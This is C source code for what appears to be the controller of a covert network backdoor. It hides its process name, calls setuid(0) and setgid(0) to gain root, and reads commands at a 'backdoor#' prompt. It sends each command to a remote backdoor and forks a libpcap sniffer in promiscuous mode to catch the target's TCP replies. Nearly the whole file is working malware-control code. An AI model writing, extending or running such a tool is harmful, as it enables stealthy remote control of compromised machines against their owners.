#include "pkt_sniffer.h"

// Function Prototypes
void pkt_callback (u_char*, const struct pcap_pkthdr*, const u_char*);

//void send_command (char *);
void send_command (char *, char *, int, int, char *);

int main (int argc, char **argv)
{ 
    char command[MAX], filter[MAX];
    int result;
    char *nic_dev; 
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* nic_descr;
    struct bpf_program fp;      // holds compiled program     
    bpf_u_int32 maskp;          // subnet mask               
    bpf_u_int32 netp;           // ip                        
    u_char* args = NULL;
    pcap_if_t *interface_list;

    /* mask the process name */
    memset(argv[0], 0, strlen(argv[0]));	
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    /* change the UID/GID to 0 (raise privs) */
    setuid(0);
    setgid(0);

    if (argc < 4) {
        fprintf(stdout,"Usage: %s \"src_ip\" \"dst_ip\" src_port dst_port\n", argv[0]);
        return 0;
    }
    
    //printf("%s %s %d %d\n", argv[1], argv[2], atoi(argv[3]), atoi(argv[4]));
    
    while (1) {    
        printf("backdoor# ");
        memset(command, 0, sizeof(command));
        
        int n = 0;
        while ((command[n++] = getchar()) != '\n')
            ;
        
        command[strlen(command) - 1] = 0; // remove trailing \n

        /* setup packet capturing */

        // find the first NIC that is up and sniff packets from it    	
        //nic_dev = pcap_lookupdev(errbuf);
        result = pcap_findalldevs (&interface_list, errbuf);
        if (result == -1) 
        {
            fprintf(stderr, "%s\n", errbuf);
            exit(1);
        }
        
        nic_dev = interface_list->name;
        //memset(nic_dev, 0, interface_list);

        // Use pcap to get the IP address and subnet mask of the device 
        pcap_lookupnet (nic_dev, &netp, &maskp, errbuf);

        // open the device for packet capture & set the device in promiscuous mode 
        nic_descr = pcap_open_live (nic_dev, BUFSIZ, 1, -1, errbuf);
        if (nic_descr == NULL)
        { 
            printf("pcap_open_live(): %s\n",errbuf); 
            exit(1); 
        }

        char filter[1024];

        memset(filter, 0x0, sizeof(filter));

        sprintf(filter, "tcp and src %s", argv[2]);
        
        // Compile the filter expression
        if (pcap_compile (nic_descr, &fp, filter, 0, netp) == -1)
        { 
            fprintf(stderr,"Error calling pcap_compile\n"); 
            exit(1);
        }

        // Load the filter into the capture device
        if (pcap_setfilter (nic_descr, &fp) == -1)
        { 
            fprintf(stderr,"Error setting filter\n"); 
            exit(1); 
        }
        
        int pid = fork();

        if (pid == -1) {
            printf("fork(): %s\n", errbuf);
            exit(1);
        } else if (pid == 0) {
            pcap_loop (nic_descr, -1, pkt_callback, args);
        } else {
            // Sending a command to a backdoor
            send_command(argv[1], argv[2], atoi(argv[3]), atoi(argv[4]), command);   
            sleep(1);
        }

        /* capture and pass packets to handler */
        //fprintf(stdout,"\nCapture Session Done\n");
    }
    return 0;
}

